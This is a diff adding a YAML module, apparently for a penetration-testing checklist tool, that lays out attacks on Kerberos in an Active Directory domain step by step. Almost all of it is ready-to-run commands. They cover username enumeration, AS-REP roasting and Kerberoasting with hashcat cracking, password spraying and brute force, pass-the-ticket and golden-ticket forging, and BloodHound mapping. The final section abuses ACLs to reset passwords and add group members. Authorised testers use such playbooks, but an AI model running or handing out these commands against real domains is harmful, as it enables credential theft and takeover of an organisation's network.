@@ -1,0 +1,117 @@
+module: kerberos
+name: Kerberos (88)
+inputs: [USERS, PASS, DOMAIN, OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / KDC present
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN" $IP
+      - id: realm
+        text: Note realm / domain + DC name (needed for everything below)
+        manual: true
+        commands: |
+          # $DOMAIN = realm (e.g. CORP.LOCAL). Add DC to /etc/hosts.
+          # nxc smb $IP  -> pulls domain/hostname
+      - id: clock
+        text: Fix clock skew (Kerberos fails if skew > 5 min)
+        commands: |
+          sudo ntpdate $IP
+          sudo rdate -n $IP
+
+  - id: enum
+    name: User Enumeration
+    steps:
+      - id: kerbrute
+        text: Username enumeration (no creds, pre-auth timing)
+        commands: |
+          kerbrute userenum -d $DOMAIN --dc $IP $USERLIST
+      - id: nmap_enum
+        text: NSE user enumeration
+        commands: |
+          nmap -p$PORT --script=krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN",userdb=$USERLIST $IP
+
+  - id: roasting
+    name: Roasting (offline crack surface)
+    steps:
+      - id: asrep
+        text: AS-REP roast (users without pre-auth)
+        commands: |
+          impacket-GetNPUsers $DOMAIN/ -usersfile $USERLIST -dc-ip $IP -no-pass -format hashcat -outputfile asrep.hash
+          impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP
+      - id: asrep_crack
+        text: Crack AS-REP hashes
+        commands: |
+          hashcat -m 18200 asrep.hash $PASSLIST
+      - id: kerberoast
+        text: Kerberoast (SPN accounts, needs any valid creds)
+        commands: |
+          impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile tgs.hash
+          nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.out
+      - id: kerberoast_crack
+        text: Crack TGS hashes
+        commands: |
+          hashcat -m 13100 tgs.hash $PASSLIST
+
+  - id: creds
+    name: Password Spraying
+    authorized: true
+    steps:
+      - id: spray
+        text: Password spray over Kerberos (no lockout noise vs SMB)
+        commands: |
+          kerbrute passwordspray -d $DOMAIN --dc $IP $USERLIST '$PASS'
+      - id: bruteuser
+        text: Brute a single user's password
+        commands: |
+          kerbrute bruteuser -d $DOMAIN --dc $IP $PASSLIST <user>
+
+  - id: tickets
+    name: Tickets & Post-Access
+    steps:
+      - id: gettgt
+        text: Request a TGT with known creds
+        commands: |
+          impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $IP
+          export KRB5CCNAME=$USER.ccache
+      - id: ptt
+        text: Pass-the-ticket (use ccache for auth)
+        commands: |
+          KRB5CCNAME=$USER.ccache impacket-psexec -k -no-pass $DOMAIN/$USER@<target>
+      - id: overpass
+        text: Overpass-the-hash (hash to TGT)
+        manual: true
+        commands: |
+          impacket-getTGT $DOMAIN/$USER -hashes :<NThash> -dc-ip $IP
+      - id: golden
+        text: Golden ticket (post-DA, needs krbtgt hash + domain SID)
+        manual: true
+        commands: |
+          impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain $DOMAIN Administrator
+
+  - id: graph
+    name: Attack Path Mapping (BloodHound / BloodyAD)
+    steps:
+      - id: bloodhound
+        text: Collect the domain graph (with any valid creds)
+        commands: |
+          bloodhound-ce-python -d $DOMAIN -u $USER -p $PASS -ns $IP -c all --zip
+          nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All --dns-server $IP
+      - id: bloodyad_enum
+        text: Enumerate writable objects / quick wins
+        commands: |
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP get writable
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP get children DC=$DOMAIN
+      - id: bloodyad_abuse
+        text: Abuse an ACL edge BloodHound found (authorized)
+        authorized: true
+        manual: true
+        commands: |
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP set password <target> 'NewP@ss1'
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP add groupMember '<group>' $USER
+          bloodyAD -u $USER -p '$PASS' -d $DOMAIN --host $IP add uac <target> -f DONT_REQ_PREAUTH
